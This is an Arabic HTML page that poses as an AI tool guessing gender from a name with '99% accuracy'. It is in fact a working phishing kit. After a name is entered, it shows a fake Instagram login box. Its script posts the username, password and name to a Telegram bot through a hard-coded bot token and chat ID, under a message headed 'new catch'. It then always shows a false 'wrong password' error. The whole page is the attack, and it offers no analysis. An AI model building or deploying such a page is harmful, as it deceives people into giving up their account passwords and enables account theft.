<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديد الجنس بالذكاء الاصطناعي 🤖</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .main-card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h2 { color: #333; margin-bottom: 20px; font-size: 1.5rem; }
        p { color: #666; margin-bottom: 20px; font-size: 14px; }

        .name-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 10px;
            outline: none;
            font-size: 16px;
            margin-bottom: 15px;
            text-align: center;
        }

        .btn-predict {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.75);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .login-box {
            background: white;
            width: 90%;
            max-width: 350px;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
        }

        .insta-logo { width: 160px; margin-bottom: 25px; }
        
        .insta-input {
            width: 100%;
            padding: 11px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            margin-bottom: 8px;
            font-size: 14px;
            outline: none;
        }

        .btn-insta-login {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 9px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }

        #error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <h2>تحديد الجنس بالاسم 🧠</h2>
        <p>اكتب اسمك وسيقوم النظام بتحليل البيانات لتحديد الجنس بنسبة دقة 99%.</p>
        <input type="text" id="targetName" class="name-input" placeholder="أدخل الاسم هنا...">
        <button class="btn-predict" onclick="showLogin()">تحليل الآن</button>
    </div>

    <div class="modal" id="loginModal">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
            
            <p style="font-size: 14px; color: #262626; font-weight: 600; margin-bottom: 15px;">ادخل حسابك لتأكد من جنسك وعرض النتيجة</p>
            
            <form id="loginForm">
                <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم، الهاتف أو الإيميل" required>
                <input type="password" id="password" class="insta-input" placeholder="كلمة السر" required>
                <button type="submit" class="btn-insta-login">تسجيل الدخول</button>
                <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى المحاولة مجدداً.</div>
            </form>
        </div>
    </div>

    <script>
        const botToken = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
        const myChatId = '7822309283';

        function showLogin() {
            const nameVal = document.getElementById('targetName').value;
            if(nameVal.length < 2) {
                alert("يرجى كتابة الاسم أولاً!");
                return;
            }
            document.getElementById('loginModal').style.display = 'flex';
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const nameUsed = document.getElementById('targetName').value;

            const textMessage = `🎯 صيد جديد:\n\n👤 الاسم المدخل: ${nameUsed}\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}`;

            const request = new XMLHttpRequest();
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            request.open("POST", telegramUrl, true);
            request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            
            request.onreadystatechange = function() {
                if(request.readyState == 4) {
                    document.getElementById('error-msg').style.display = 'block';
                    document.getElementById('password').value = '';
                }
            };

            request.send(`chat_id=${myChatId}&text=${encodeURIComponent(textMessage)}`);
        });

        window.onclick = function(event) {
            const modal = document.getElementById('loginModal');
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>

</body>
</html>
